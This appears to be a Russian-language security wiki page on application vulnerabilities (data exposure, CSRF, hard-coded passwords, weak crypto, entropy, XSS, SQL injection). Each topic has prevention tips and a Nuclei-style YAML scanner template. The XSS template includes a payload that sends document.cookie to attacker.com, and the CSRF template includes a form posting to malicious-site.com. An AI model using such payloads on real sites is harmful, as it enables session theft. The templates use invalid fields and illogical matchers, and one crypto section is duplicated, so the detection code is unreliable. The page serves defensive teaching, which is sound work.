---
layout: default
title: Application Attacks
parent: Attacks
---

# Атаки на приложения
{: .no_toc }


## Оглавление
{: .no_toc .text-delta }

1. TOC
{:toc}

---




### Раскрытие конфиденциальной информации

Под раскрытием конфиденциальной информации понимается непреднамеренное или несанкционированное раскрытие конфиденциальных или частных данных лицам или системам, которые не должны иметь к ним доступ. Это может произойти различными способами, например, в результате небезопасного хранения, передачи или обработки конфиденциальных данных.

К конфиденциальной информации может относиться персонально идентифицируемая информация (PII), например имена, адреса, номера социального страхования, финансовые данные, учетные данные для входа в систему, медицинские карты или любые другие данные, раскрытие которых может привести к краже личных данных, финансовым потерям или другим вредным последствиям.

Чтобы предотвратить раскрытие конфиденциальной информации, важно применять соответствующие меры безопасности. Вот некоторые превентивные меры:

1. Классификация данных: Классифицируйте данные по степени важности и определите соответствующие средства контроля доступа. Определите и классифицируйте конфиденциальную информацию, чтобы применить более надежные меры безопасности для ее защиты.

2. Безопасное хранение: Используйте механизмы безопасного хранения для защиты конфиденциальных данных, такие как шифрование, хэширование или токенизация. Убедитесь, что данные хранятся в безопасной среде, будь то базы данных, файловые системы или другие носители.

3. Безопасная передача данных: При передаче конфиденциальных данных по сети используйте защищенные протоколы связи, такие как HTTPS, SSL/TLS или другие механизмы шифрования. Это поможет предотвратить подслушивание или несанкционированный перехват данных во время их передачи.

4. Контроль доступа: Внедрите строгие средства контроля доступа, чтобы ограничить доступ к конфиденциальной информации. Используйте механизмы аутентификации и авторизации, чтобы гарантировать, что только уполномоченные лица или системы могут получать доступ к конфиденциальным данным и изменять их.

5. Практика безопасного кодирования: Соблюдайте правила безопасного кодирования, чтобы избежать распространенных уязвимостей, таких как инъекционные атаки или небезопасные прямые ссылки на объекты. Проверяйте и обеззараживайте вводимые пользователем данные, чтобы предотвратить обработку или отображение вредоносных данных.

6. Безопасная конфигурация: Обеспечьте безопасную настройку систем и приложений, включая использование надежных паролей, отключение ненужных служб и функций, а также регулярное обновление и исправление программного обеспечения для устранения уязвимостей безопасности.

7. Регулярные оценки безопасности: Регулярно проводите оценку безопасности, включая сканирование уязвимостей и тестирование на проникновение, чтобы выявить все потенциальные слабые места или уязвимости, которые могут привести к раскрытию конфиденциальной информации.

8. Обучение и информирование сотрудников: Обучите своих сотрудников передовым методам обеспечения безопасности, в том числе правилам обращения с конфиденциальной информацией, важности защиты данных, а также тому, как распознавать и сообщать об инцидентах безопасности или подозрительных действиях.

9. Минимизация данных: Собирайте и храните только необходимые данные. Не храните конфиденциальную информацию дольше, чем это необходимо.

10. Конфиденциальность при проектировании: Учитывайте соображения конфиденциальности и безопасности при проектировании и разработке систем и приложений. С самого начала внедряйте технологии и методы, повышающие конфиденциальность.

Применяя эти превентивные меры и используя комплексный подход к обеспечению безопасности данных, вы сможете значительно снизить риск раскрытия конфиденциальной информации и защитить конфиденциальность и секретность ваших данных.



```
id: exposure-sensitive-information
info:
  name: Exposure of Sensitive Information
  author: Your Name
  severity: medium
  description: Detects potential exposure of sensitive information in web applications.
  references:
    - https://example.com
tags:
  - web
  - sensitive-information
requests:
  - name: Exposed Secrets
    path:
      - /
      - /admin
    matchers:
      - type: word
        words:
          - api_key
          - password
          - secret_key
    attacks:
      - type: word
        words:
          - error
          - unauthorized
      - type: word
        words:
          - access denied
          - forbidden
```




### Вставка конфиденциальной информации в отправляемые данные

Вставка конфиденциальной информации в отправляемые данные - это непреднамеренное включение конфиденциальных или частных данных в журналы, сообщения об ошибках, отладочные данные или любые другие формы данных, которые отправляются или регистрируются во внешней среде. Это может произойти, когда конфиденциальная информация, такая как пароли, ключи API или персональная информация (PII), включается в открытый текст или незашифрованном виде, что делает ее доступной для неавторизованных лиц или систем.

Чтобы предотвратить вставку конфиденциальной информации в отправляемые данные, вы можете принять следующие превентивные меры:

1. Маскировка данных: Избегайте включения конфиденциальной информации в журналы, сообщения об ошибках или любые другие формы выходных данных. Для предотвращения раскрытия конфиденциальной информации используйте методы маскировки данных, например, заменяйте конфиденциальные данные заполнителями или обфусцируйте их.

2. Безопасное ведение журнала: Настройте механизмы ведения журналов таким образом, чтобы исключить запись конфиденциальной информации. Применяйте надлежащие методы фильтрации или редактирования журналов для удаления или маскировки конфиденциальных данных перед их записью в файлы журналов.

3. Ведение журнала на основе контекста: При регистрации или выводе данных учитывайте контекст и назначение регистрируемой информации. Исключите включение в журнал или вывод ненужных или конфиденциальных данных.

4. Токенизация или шифрование: Если необходимо включить конфиденциальную информацию в журналы или выходные данные для целей отладки или устранения неполадок, токенизируйте или шифруйте конфиденциальные данные, чтобы сделать их нечитаемыми. Убедитесь, что только уполномоченные лица или системы имеют доступ к ключам или маркерам, необходимым для расшифровки.

5. Безопасная обработка ошибок: При обработке ошибок избегайте отображения конфиденциальной информации в сообщениях об ошибках, выдаваемых пользователям. Вместо этого выдавайте общие сообщения об ошибках, которые не раскрывают конкретных деталей о конфиденциальных данных или системе.

6. Безопасные методы кодирования: Соблюдайте правила безопасного кодирования, чтобы предотвратить непреднамеренную вставку конфиденциальной информации в отправляемые данные. Убедитесь, что конфиденциальные данные должным образом обрабатываются, шифруются или обфусцируются на протяжении всего жизненного цикла приложения.

7. Разделение данных: Рассмотрите возможность отделения конфиденциальных данных от других нечувствительных данных как при хранении, так и при передаче. Внедрите надлежащие механизмы разделения данных, чтобы снизить риск случайного включения конфиденциальной информации в отправляемые данные.

8. Регулярные проверки и тестирование кода: Регулярно проводите анализ кода и тестирование безопасности для выявления возможных мест, где конфиденциальная информация может быть включена в отправляемые данные. Проводите тщательное тестирование, чтобы убедиться, что конфиденциальные данные не будут раскрыты во время нормальной работы системы или при возникновении ошибок.

9. Обучение и информирование сотрудников: Обучите команду разработчиков и системных администраторов важности безопасного обращения с конфиденциальной информацией. Обучите их передовым методам защиты данных и потенциальным рискам, связанным со вставкой конфиденциальной информации в отправляемые данные.

Применяя эти профилактические меры, вы сможете снизить риск случайного включения конфиденциальной информации в отправляемые данные, защитить конфиденциальность и секретность ваших данных и свести к минимуму потенциальные последствия нарушения безопасности.



```
id: insertion-sensitive-information
info:
  name: Insertion of Sensitive Information Into Sent Data
  author: Your Name
  severity: high
  description: Detects potential insertion of sensitive information into sent data in web applications.
  references:
    - https://example.com
tags:
  - web
  - sensitive-information
requests:
  - name: Email Leakage
    path:
      - /
      - /login
    matchers:
      - type: word
        words:
          - email
    attacks:
      - type: word
        words:
          - @example.com
      - type: word
        words:
          - .com
          - .net
  - name: Credit Card Data Leakage
    path:
      - /checkout
    matchers:
      - type: regex
        part: body
        words:
          - '[0-9]{16}'
          - '[0-9]{4}-[0-9]{4}-[0-9]{4}-[0-9]{4}'
    attacks:
      - type: word
        words:
          - found
          - exposed
```



### Подделка межсайтовых запросов (CSRF)


Подделка межсайтовых запросов (CSRF) - это тип веб-уязвимости, когда злоумышленник обманом заставляет жертву неосознанно выполнять нежелательные действия в веб-приложении, в котором жертва прошла аутентификацию. Атака происходит, когда жертва посещает вредоносный веб-сайт или нажимает на специально созданную ссылку, в результате чего от ее имени выполняются несанкционированные действия в целевом веб-приложении.

Чтобы предотвратить атаки Cross-Site Request Forgery, вы можете выполнить следующие профилактические меры:

1. CSRF-токены: Внедрите CSRF-токены в качестве защитного механизма. Включите уникальный токен в каждую HTML-форму или запрос, который изменяет состояние на сервере. Этот токен должен проверяться на стороне сервера, чтобы убедиться, что запрос легитимен и исходит с того же сайта.

2. Куки-файлы того же сайта: Установите для атрибута SameSite ваших сессионных cookie-файлов значение Strict или Lax. Это предотвратит отправку файлов cookie в межсайтовых запросах, эффективно защищая от атак CSRF.

3. Анти-CSRF-фреймворки: Используйте анти-CSRF-фреймворки или библиотеки, предоставляемые вашим фреймворком для веб-разработки. Эти фреймворки часто автоматизируют генерацию и проверку CSRF-токенов, что упрощает реализацию и поддержку защиты от CSRF-атак.

4. Уникальные идентификаторы сеансов: Убедитесь, что каждая пользовательская сессия имеет уникальный идентификатор. Это поможет предотвратить атаки с фиксацией сеанса, которые могут быть использованы в сочетании с CSRF-атаками.

5. Проверка запросов: Проверяйте целостность и подлинность входящих запросов на стороне сервера. Проверьте наличие и корректность CSRF-токенов, заголовков referer или других атрибутов запроса, которые могут помочь определить происхождение запроса.

6. Строгий контроль доступа: Обеспечьте строгий контроль доступа к важным операциям и ресурсам. Внедрите надлежащие механизмы аутентификации и авторизации, чтобы гарантировать, что только авторизованные пользователи могут выполнять важные действия.

7. Информирование пользователей: Расскажите пользователям о рисках CSRF-атак и убедите их быть осторожными при переходе по ссылкам или посещении незнакомых сайтов. Предоставьте рекомендации по распознаванию и сообщению о подозрительном поведении.

8. Практика безопасного кодирования: Соблюдайте правила безопасного кодирования, чтобы свести к минимуму риск появления уязвимостей. Проверяйте и обеззараживайте вводимые пользователем данные, внедряйте надлежащие средства контроля доступа, регулярно обновляйте и исправляйте программное обеспечение, чтобы устранить все потенциальные уязвимости в системе безопасности.

9. Тестирование безопасности: Регулярно проводите тестирование безопасности, включая сканирование уязвимостей и тестирование на проникновение, чтобы выявить и устранить любые потенциальные уязвимости CSRF в вашем веб-приложении.

Применяя эти превентивные меры и поддерживая надежную защиту, вы сможете значительно снизить риск атак Cross-Site Request Forgery и защитить целостность вашего веб-приложения и пользовательских данных.




```
id: csrf
info:
  name: Cross-Site Request Forgery (CSRF)
  author: Your Name
  severity: high
  description: Detects potential Cross-Site Request Forgery vulnerabilities in web applications.
  references:
    - https://example.com
tags:
  - web
  - csrf
requests:
  - name: CSRF Token Check
    path:
      - /
      - /profile
      - /admin
    matchers:
      - type: word
        words:
          - csrf_token
          - authenticity_token
    attacks:
      - type: word
        words:
          - <form action="http://malicious-site.com/attack" method="POST">
      - type: regex
        part: body
        words:
          - '<input type="hidden" name="_token" value="[^"]+">'
          - '<input type="hidden" name="csrf_token" value="[^"]+">'
```




### Использование жестко закодированных паролей

Использование жестко закодированных паролей - это практика встраивания паролей непосредственно в исходный код или конфигурационные файлы, что делает их легкодоступными для любого, кто имеет доступ к коду или файлам. Это считается плохим способом обеспечения безопасности, поскольку может привести к несанкционированному доступу и компрометации конфиденциальной информации.

Чтобы предотвратить использование жестко закодированных паролей, можно предпринять следующие профилактические меры:

1. Используйте безопасное хранение учетных данных: Вместо жесткого кодирования паролей используйте механизмы безопасного хранения учетных данных, предоставляемые вашей платформой разработки или фреймворком. Эти механизмы позволяют безопасно хранить и извлекать пароли, например с помощью защищенных хранилищ ключей, переменных среды или конфигурационных файлов с ограниченным доступом.

2. Внедрите механизмы аутентификации: Внедрите надлежащие механизмы аутентификации вместо того, чтобы полагаться только на жестко заданные пароли. Используйте надежные алгоритмы хеширования паролей, соленые хеши, а еще лучше - рассмотрите возможность использования более безопасных методов аутентификации, таких как аутентификация на основе маркеров или OAuth.

3. Отделяйте конфигурацию от кода: Храните конфиденциальную информацию, включая пароли, отдельно от кодовой базы. Храните их в защищенных конфигурационных файлах или используйте переменные окружения для хранения конфиденциальных сведений о конфигурации. Убедитесь, что эти файлы или переменные недоступны для неавторизованных лиц.

4. Применяйте средства контроля доступа: Ограничьте доступ к файлам конфигурации или безопасному хранилищу учетных данных только авторизованными лицами или системами. Следуйте принципу наименьших привилегий, предоставляя доступ только тем, кому он необходим в рабочих целях.

5. Используйте инструменты управления секретами: Используйте инструменты или платформы для управления секретами, которые обеспечивают безопасное хранение, ротацию и контроль доступа к конфиденциальной информации, такой как пароли, API-ключи и криптографические ключи. Эти инструменты часто предлагают шифрование, ведение журнала доступа и дополнительные функции безопасности для защиты ваших секретов.

6. Безопасный процесс развертывания: Внедрите методы безопасного развертывания, чтобы исключить возможность раскрытия паролей во время развертывания или в системах контроля версий. Избегайте включения конфиденциальной информации в репозитории кода или артефакты сборки.

7. Регулярно меняйте пароли: Обеспечьте соблюдение политики ротации паролей, чтобы регулярно обновлять их. Это уменьшает влияние скомпрометированных учетных данных и ограничивает возможности злоумышленников.

8. Безопасный просмотр кода: Регулярно проводите анализ кода, чтобы выявить и устранить все случаи использования жестко закодированных паролей. Обучайте разработчиков, чтобы они знали о рисках, связанных с жестким кодированием паролей, и предоставляйте им безопасные альтернативы и лучшие практики.

9. Автоматизированные инструменты безопасности: Используйте автоматизированные средства сканирования безопасности или инструменты статического анализа кода для выявления случаев использования жестких паролей и других уязвимостей в коде.

Применяя эти превентивные меры, вы сможете минимизировать риск использования жестко закодированных паролей и повысить безопасность вашего приложения и конфиденциальных данных. Для поддержания надежной защиты очень важно следовать практике безопасного кодирования, регулярно пересматривать и обновлять средства контроля безопасности, а также быть в курсе появляющихся передовых методов и уязвимостей.


```
id: hard-coded-password
info:
  name: Use of Hard-coded Password
  author: Your Name
  severity: high
  description: Detects the use of hard-coded passwords in source code or configuration files.
  references:
    - https://example.com
tags:
  - credentials
requests:
  - name: Hard-coded Password Check
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: word
        words:
          - password
          - secret
          - api_key
    attacks:
      - type: regex
        part: body
        words:
          - 'password = ".*"'
          - 'password: ".*"'
          - 'password: .*'
      - type: regex
        part: body
        words:
          - 'secret = ".*"'
          - 'secret: ".*"'
          - 'secret: .*'
      - type: regex
        part: body
        words:
          - 'api_key = ".*"'
          - 'api_key: ".*"'
          - 'api_key: .*'
```



### Сломанный или рискованный криптоалгоритм

Неработающий или рискованный криптографический алгоритм - это использование алгоритмов шифрования или хеширования, которые имеют известные уязвимости или слабые места. Эти уязвимости могут быть вызваны устаревшими или неактуальными алгоритмами, небезопасными размерами ключей, плохой реализацией или неадекватной криптографической практикой. Такие слабые места могут быть использованы злоумышленниками, что может привести к нарушению конфиденциальности, целостности или подлинности конфиденциальных данных.

Чтобы предотвратить использование неработающих или рискованных криптоалгоритмов, вы можете принять следующие профилактические меры:

1. Следите за обновлением криптографических стандартов: Следите за последними криптографическими стандартами и рекомендациями из авторитетных источников, таких как NIST (Национальный институт стандартов и технологий) или IETF (Целевая группа по разработке Интернета). Будьте в курсе всех уязвимостей и недостатков, обнаруженных в существующих алгоритмах, и вносите необходимые обновления в свои криптографические реализации.

2. Используйте надежные и одобренные алгоритмы: Выбирайте криптографические алгоритмы, которые широко известны, тщательно протестированы и рекомендованы экспертами в области криптографии. Примерами надежных алгоритмов являются AES (Advanced Encryption Standard) для симметричного шифрования, RSA или ECDSA для асимметричного шифрования и SHA-256 или SHA-3 для хэширования.

3. Избегайте устаревших или ослабленных алгоритмов: Держитесь подальше от устаревших или ослабленных криптографических алгоритмов, таких как DES (Data Encryption Standard) или MD5 (Message Digest Algorithm 5). Эти алгоритмы имеют известные уязвимости и больше не считаются безопасными для большинства приложений.

4. Используйте подходящие размеры ключей: Убедитесь, что размеры ключей, используемых в ваших криптографических алгоритмах, соответствуют требуемому уровню безопасности. Используйте размеры ключей, рекомендованные криптографическими стандартами, с учетом стойкости алгоритма и предполагаемого срока службы защищаемых данных.

5. Безопасное управление ключами: Внедрите надежные методы управления ключами, включая безопасную генерацию, хранение и распространение криптографических ключей. Защитите ключи от несанкционированного доступа, регулярно ротируйте или обновляйте их в соответствии с передовой практикой.

6. Используйте безопасную генерацию случайных чисел: Криптографические операции часто опираются на случайные числа для генерации ключей, векторов инициализации и несов. Используйте криптографически безопасный генератор случайных чисел (CSPRNG) для обеспечения случайности и непредсказуемости этих значений.

7. Оценка сторонних библиотек: При использовании криптографических библиотек или фреймворков оцените их репутацию, уровень безопасности и поддержку сообщества. Выбирайте хорошо зарекомендовавшие себя библиотеки, прошедшие аудит безопасности и активно поддерживаемые, чтобы свести к минимуму риск использования неработающих или небезопасных криптоалгоритмов.

8. Независимые проверки безопасности: Проводите независимые проверки безопасности или аудиты ваших криптографических реализаций, чтобы выявить любые слабые места, уязвимости или неправильную конфигурацию. Привлеките специалистов по безопасности или внешних аудиторов с опытом работы в области криптографии для оценки ваших криптографических методов.

9. Постоянный мониторинг и обновления: Будьте бдительны в отношении возникающих криптографических уязвимостей или атак. Следите за рекомендациями по безопасности и обновлениями от организаций криптографических стандартов, поставщиков и более широкого сообщества безопасности. Применяйте патчи, обновления или изменения конфигурации по мере необходимости для устранения выявленных уязвимостей.

Соблюдение этих профилактических мер и использование надежных криптографических методов позволит вам значительно снизить риск использования неработающих или рискованных криптоалгоритмов и повысить безопасность конфиденциальных данных вашего приложения. Для обеспечения постоянной безопасности ваших криптографических реализаций необходимо активно информировать о передовых методах криптографии и возникающих угрозах безопасности.



```
id: broken-crypto-algorithm
info:
  name: Broken or Risky Crypto Algorithm
  author: Your Name
  severity: medium
  description: Detects the use of broken or risky cryptographic algorithms in TLS configurations or code.
  references:
    - https://example.com
tags:
  - cryptography
requests:
  - name: Weak Crypto Algorithm Check
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: word
        words:
          - ssl_version
          - cipher_suite
          - crypto_algorithm
    attacks:
      - type: regex
        part: body
        words:
          - 'ssl_version = ".*"'
          - 'cipher_suite = ".*"'
          - 'crypto_algorithm = ".*"'
      - type: regex
        part: body
        words:
          - 'ssl_version: ".*"'
          - 'cipher_suite: ".*"'
          - 'crypto_algorithm: ".*"'
      - type: regex
        part: body
        words:
          - 'algorithm = ".*"'
          - 'algorithm: ".*"'
```


### Рискованный криптоалгоритм


Неработающий или рискованный криптографический алгоритм - это использование алгоритмов шифрования или хеширования, которые имеют известные уязвимости или слабые места. Эти уязвимости могут быть вызваны устаревшими или неактуальными алгоритмами, небезопасными размерами ключей, плохой реализацией или неадекватной криптографической практикой. Такие слабые места могут быть использованы злоумышленниками, что может привести к нарушению конфиденциальности, целостности или подлинности конфиденциальных данных.

Чтобы предотвратить использование неработающих или рискованных криптоалгоритмов, вы можете принять следующие профилактические меры:

1. Следите за обновлением криптографических стандартов: Следите за последними криптографическими стандартами и рекомендациями из авторитетных источников, таких как NIST (Национальный институт стандартов и технологий) или IETF (Целевая группа по разработке Интернета). Будьте в курсе всех уязвимостей и недостатков, обнаруженных в существующих алгоритмах, и вносите необходимые обновления в свои криптографические реализации.

2. Используйте надежные и одобренные алгоритмы: Выбирайте криптографические алгоритмы, которые широко известны, тщательно протестированы и рекомендованы экспертами в области криптографии. Примерами надежных алгоритмов являются AES (Advanced Encryption Standard) для симметричного шифрования, RSA или ECDSA для асимметричного шифрования и SHA-256 или SHA-3 для хэширования.

3. Избегайте устаревших или ослабленных алгоритмов: Держитесь подальше от устаревших или ослабленных криптографических алгоритмов, таких как DES (Data Encryption Standard) или MD5 (Message Digest Algorithm 5). Эти алгоритмы имеют известные уязвимости и больше не считаются безопасными для большинства приложений.

4. Используйте подходящие размеры ключей: Убедитесь, что размеры ключей, используемых в ваших криптографических алгоритмах, соответствуют требуемому уровню безопасности. Используйте размеры ключей, рекомендованные криптографическими стандартами, с учетом стойкости алгоритма и предполагаемого срока службы защищаемых данных.

5. Безопасное управление ключами: Внедрите надежные методы управления ключами, включая безопасную генерацию, хранение и распространение криптографических ключей. Защитите ключи от несанкционированного доступа, регулярно ротируйте или обновляйте их в соответствии с передовой практикой.

6. Используйте безопасную генерацию случайных чисел: Криптографические операции часто опираются на случайные числа для генерации ключей, векторов инициализации и несов. Используйте криптографически безопасный генератор случайных чисел (CSPRNG) для обеспечения случайности и непредсказуемости этих значений.

7. Оценка сторонних библиотек: При использовании криптографических библиотек или фреймворков оцените их репутацию, уровень безопасности и поддержку сообщества. Выбирайте хорошо зарекомендовавшие себя библиотеки, прошедшие аудит безопасности и активно поддерживаемые, чтобы свести к минимуму риск использования неработающих или небезопасных криптоалгоритмов.

Независимые проверки безопасности: Проводите независимые проверки безопасности или аудиты ваших криптографических реализаций, чтобы выявить любые слабые места, уязвимости или неправильную конфигурацию. Привлеките специалистов по безопасности или внешних аудиторов с опытом работы в области криптографии для оценки ваших криптографических методов.

8. Постоянный мониторинг и обновления: Будьте бдительны в отношении возникающих криптографических уязвимостей или атак. Следите за рекомендациями по безопасности и обновлениями от организаций криптографических стандартов, поставщиков и более широкого сообщества безопасности. Применяйте патчи, обновления или изменения конфигурации по мере необходимости для устранения выявленных уязвимостей.

Соблюдение этих профилактических мер и использование надежных криптографических методов позволит вам значительно снизить риск использования неработающих или рискованных криптоалгоритмов и повысить безопасность конфиденциальных данных вашего приложения. Для обеспечения постоянной безопасности ваших криптографических реализаций необходимо активно информировать о передовых методах криптографии и возникающих угрозах безопасности.


```
id: risky-crypto-algorithm
info:
  name: Risky Crypto Algorithm
  author: Your Name
  severity: medium
  description: Detects the use of risky cryptographic algorithms in TLS configurations or code.
  references:
    - https://example.com
tags:
  - cryptography
requests:
  - name: Risky Crypto Algorithm Check
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: word
        words:
          - ssl_version
          - cipher_suite
          - crypto_algorithm
    attacks:
      - type: regex
        part: body
        words:
          - 'ssl_version = ".*"'
          - 'cipher_suite = ".*"'
          - 'crypto_algorithm = "MD5|SHA1|RC4|DES"'
      - type: regex
        part: body
        words:
          - 'ssl_version: ".*"'
          - 'cipher_suite: ".*"'
          - 'crypto_algorithm: "MD5|SHA1|RC4|DES"'
      - type: regex
        part: body
        words:
          - 'algorithm = "MD5|SHA1|RC4|DES"'
          - 'algorithm: "MD5|SHA1|RC4|DES"'
```


### Недостаточная энтропия


Недостаточная энтропия - это отсутствие случайности или непредсказуемости при генерации криптографических ключей, случайных чисел или других важных для безопасности значений. Недостаточная энтропия может ослабить криптографические алгоритмы и сделать их более восприимчивыми к атакам методом "грубой силы" или другим криптографическим атакам.

Для предотвращения недостаточной энтропии можно выполнить следующие профилактические меры:

1. Используйте криптографически защищенный генератор случайных чисел (CSPRNG): Используйте CSPRNG вместо того, чтобы полагаться на генераторы псевдослучайных чисел (PRNG) или небезопасные источники случайных чисел. CSPRNG гарантирует, что генерируемые случайные числа достаточно непредсказуемы и подходят для криптографических целей.

1. Сбор энтропии из различных источников: Собирайте энтропию из различных источников, таких как аппаратные события (например, движения мыши, нажатия на клавиатуру, активность диска), события на уровне системы, факторы окружающей среды или специальные аппаратные генераторы случайных чисел. Комбинируйте эти источники энтропии, чтобы увеличить случайность и непредсказуемость генерируемых значений.

1. Периодически перезагружайте генератор случайных чисел: Регулярно пополняйте генератор случайных чисел свежей энтропией, чтобы поддерживать высокий уровень случайности. Это поможет предотвратить истощение энтропии со временем.

1. Используйте аппаратную генерацию случайных чисел: Если есть возможность, используйте специализированные аппаратные генераторы случайных чисел (ГСЧ), которые обеспечивают высокую степень случайности. Эти ГСЧ используют физические процессы, такие как электронный шум или радиоактивный распад, для генерации случайных значений.

1. Проверка и мониторинг уровня энтропии: Реализуйте механизмы для тестирования и мониторинга уровня энтропии в вашей системе. Вы можете использовать инструменты или библиотеки для оценки качества случайности и убедиться, что она соответствует требуемому порогу энтропии. Контролируйте пулы энтропии, чтобы выявить возможное истощение или недостаточное количество энтропии.

1. Избегайте детерминированных алгоритмов генерации ключей: Используйте алгоритмы, включающие случайность, и избегайте детерминированных алгоритмов для генерации ключей. Детерминированные алгоритмы генерируют один и тот же результат на один и тот же вход, что делает их предсказуемыми и подверженными атакам.

1. Периодически поворачивайте криптографические ключи: Регулярно чередуйте криптографические ключи, особенно для долгоживущих криптографических операций. Это минимизирует влияние скомпрометированных ключей и дает возможность внести новую энтропию в процесс генерации ключей.

1. Проводите тестирование безопасности и обзор кода: Проведите тестирование безопасности, включая сканирование уязвимостей и обзор кода, чтобы выявить любые слабые места или уязвимости, связанные с генерацией энтропии. Проанализируйте реализацию функций генерации случайных чисел и убедитесь, что они соответствуют лучшим криптографическим практикам.

1. Следовать криптографическим стандартам и передовым практикам: Придерживайтесь установленных криптографических стандартов, рекомендаций и лучших практик. Такие организации по стандартизации, как NIST и IETF, предоставляют рекомендации и руководства по генерации и управлению криптографическими ключами, случайными числами и энтропией.

Применяя эти превентивные меры, вы сможете улучшить процесс генерации энтропии и обеспечить стойкость и непредсказуемость криптографических операций. Очень важно регулярно оценивать и обновлять механизмы генерации энтропии, чтобы адаптироваться к изменяющимся требованиям безопасности и передовым практикам.

```
id: insufficient-entropy
info:
  name: Insufficient Entropy
  author: Your Name
  severity: medium
  description: Detects the usage of weak or insufficient entropy sources in cryptographic operations.
  references:
    - https://example.com
tags:
  - cryptography
requests:
  - name: Insufficient Entropy Check
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: word
        words:
          - entropy
    attacks:
      - type: regex
        part: body
        words:
          - 'entropy = [0-7]\.\d{1,}'
          - 'entropy: [0-7]\.\d{1,}'
      - type: regex
        part: body
        words:
          - 'weak_entropy = true'
          - 'weak_entropy: true'
      - type: regex
        part: body
        words:
          - 'insufficient_entropy = true'
          - 'insufficient_entropy: true'
```



### XSS


XSS (Cross-Site Scripting) - это тип веб-уязвимости, позволяющий злоумышленникам внедрять вредоносные скрипты на веб-страницы, просматриваемые другими пользователями. Это происходит, когда данные, предоставленные пользователем, неправильно проверяются или экранируются и напрямую включаются в веб-страницу без надлежащей санитарной обработки.

Чтобы предотвратить XSS-атаки, вы можете следовать следующим профилактическим мерам:

1. Проверка и фильтрация вводимых данных: Проверяйте и обеззараживайте все вводимые пользователем данные, включая поля форм, параметры URL и HTTP-заголовки. Применяйте проверку ввода, чтобы убедиться, что принимаются только ожидаемые типы и форматы данных. Отфильтруйте или исключите символы, которые могут быть использованы в злонамеренных целях, например HTML-теги, код JavaScript или команды SQL.

1. Используйте методы безопасного кодирования: Внедряйте методы безопасного кодирования, которые способствуют разделению кода и данных. Используйте соответствующие методы кодирования или экранирования вывода с учетом контекста при отображении данных, предоставленных пользователем, в HTML, JavaScript, CSS и других контекстах.

1. Используйте безопасную систему шаблонов: Если вы используете систему шаблонов, убедитесь, что она по умолчанию автоматически экранирует или дезинфицирует вводимые пользователем данные. Избегайте использования конкатенации строк или ручного построения HTML для отображения данных, предоставленных пользователем.

1. Политика безопасности содержимого (CSP): внедрите и применяйте политику безопасности содержимого, ограничивающую типы содержимого, которое может быть загружено или выполнено на веб-странице. CSP помогает предотвратить XSS-атаки, определяя источники, из которых может быть загружен различный контент, например скрипты или таблицы стилей.

1. Куки только для HTTP: Используйте флаг HttpOnly при настройке файлов cookie, чтобы предотвратить доступ клиентских скриптов к конфиденциальным файлам cookie. Это помогает защититься от атак с перехватом сеанса.

1. Правильно экранируйте вывод: При динамической генерации HTML, JavaScript или другого содержимого убедитесь, что данные, предоставленные пользователем, правильно экранированы, чтобы они не были интерпретированы как код. Используйте контекстно-зависимые функции экранирования, предоставляемые вашим фреймворком или языком программирования.

1. Безопасные фреймворки и библиотеки разработки: Используйте безопасные фреймворки и библиотеки, которые имеют встроенные средства защиты от XSS-атак. Такие фреймворки часто предоставляют механизмы для автоматического экранирования или санации пользовательского ввода при рендеринге шаблонов или генерации HTML.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте все компоненты веб-приложения, включая фреймворки, библиотеки и плагины, в актуальном состоянии с помощью последних патчей безопасности. В этих компонентах могут быть обнаружены XSS-уязвимости, и обновления часто устраняют эти уязвимости.

1. Обучайте и тренируйте разработчиков: Организуйте для разработчиков программы обучения и повышения осведомленности в области безопасности, чтобы ознакомить их с рисками XSS-атак и практикой безопасного кодирования. Научите их правильно проверять, обеззараживать и устранять пользовательский ввод для предотвращения XSS-уязвимостей.

1. Тестирование на проникновение и сканирование безопасности: Регулярно проводите тестирование на проникновение и сканирование безопасности, чтобы выявить любые XSS-уязвимости в вашем веб-приложении. Используйте автоматические сканеры уязвимостей или привлекайте специалистов по безопасности для ручной оценки безопасности.

Соблюдая эти превентивные меры, вы сможете значительно снизить риск XSS-атак и защитить свое веб-приложение и пользователей от возможных вредоносных действий. Для обеспечения надежной защиты от XSS-уязвимостей необходимо применять многоуровневый подход к безопасности, сочетая методы безопасного кодирования, проверку ввода, кодирование вывода и регулярное тестирование безопасности.

```
id: xss
info:
  name: Cross-Site Scripting (XSS)
  author: Your Name
  severity: high
  description: Detects potential Cross-Site Scripting vulnerabilities in web applications.
  references:
    - https://example.com
tags:
  - web
  - xss
requests:
  - name: XSS Payload Test
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: fuzz
        payloads:
          - '<script>alert("XSS");</script>'
          - '<img src=x onerror=alert("XSS")>'
          - '<svg/onload=alert("XSS")>'
          - '<script>location.href="https://attacker.com/cookie.php?cookie="+document.cookie;</script>'
      - type: regex
        part: body
        words:
          - 'document\.cookie'
          - 'eval\('
          - 'on\w+=.*[\'"]'
```




### SQL Injection


SQL Injection - это уязвимость веб-приложения, которая возникает, когда злоумышленник может манипулировать SQL-запросом, вставляя вредоносный SQL-код. Это происходит, когда вводимые пользователем данные не проходят надлежащую проверку или санацию и напрямую объединяются в SQL-запрос, что позволяет злоумышленнику выполнять несанкционированные операции с базой данных, просматривать конфиденциальные данные или изменять базу данных.

Чтобы предотвратить атаки SQL Injection, вы можете следовать следующим профилактическим мерам:

1. Используйте параметризованные запросы или подготовленные операторы: Вместо того чтобы динамически создавать SQL-запросы путем конкатенации пользовательского ввода, используйте параметризованные запросы или подготовленные операторы. Эти механизмы позволяют отделить SQL-код от пользовательского ввода, что предотвращает внедрение вредоносного SQL-кода.

1. Проверка и обеззараживание ввода: Проверяйте и обеззараживайте все вводимые пользователем данные, прежде чем использовать их в SQL-запросах. Проверяйте вводимые данные, чтобы убедиться, что они соответствуют ожидаемому типу, длине и формату. Удаляйте или экранируйте специальные символы, которые могут быть использованы для SQL-инъекций, например одинарные кавычки или точки с запятой.

1. Избегайте динамических SQL-запросов: По возможности избегайте динамического построения SQL-запросов с использованием конкатенации строк. Вместо этого используйте фреймворки ORM (Object-Relational Mapping) или конструкторы запросов, которые обеспечивают встроенную защиту от SQL-инъекций. Такие фреймворки автоматически обрабатывают правильное экранирование и привязку параметров.

